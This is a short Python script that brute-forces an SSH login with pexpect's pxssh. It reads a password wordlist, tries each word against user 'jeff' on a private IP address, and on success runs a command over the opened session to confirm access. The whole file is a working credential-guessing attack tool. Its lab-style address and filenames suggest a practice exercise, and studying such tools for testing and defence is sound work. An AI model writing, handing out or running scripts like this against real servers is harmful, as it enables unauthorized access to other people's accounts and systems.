#!/usr/bin/env python3
# Logging into an SSH server with brute force

###LIBRARIES###
from pexpect import pxssh

###VARIABLES###
#pwfile = input("Please enter the password list file:\n>")
pwfile = "/home/jeff/Desktop/sample.txt"
open_file = open(pwfile, "r", errors='ignore')
host = "192.168.29.150"
username = "jeff"

###FUNCTIONS###
#Try each word in a file as the password for an SSH login
def pwd_list():
    #Read through each line of the file
    for i in open_file:
        s = pxssh.pxssh()
        #Divide the line into a list of words
        pword = i.split()
        length = (len(pword))
        x = 0
        #Set the break-in status to "no"
        break_in = "no"
        #Try each word as the password
        while (x < length):
            pwd = pword[x]
            print("Trying password", pwd)
            try:
                s.login(host, username, pwd)
                print("You got the password!")
                break_in = "yes"
                #Demonstrate connection via SSH
                s.sendline(input("Please enter a command to confirm connection: "))
                s.prompt()
                print(s.before)
                break
            except pxssh.ExceptionPxssh as e:
                print("pxssh failed on login.")
                print(e)
                #s.close()
                #s = pxssh.pxssh()
            x += 1
        if (break_in == "yes"):
            break
    open_file.close()

###MAIN###
pwd_list()
###END###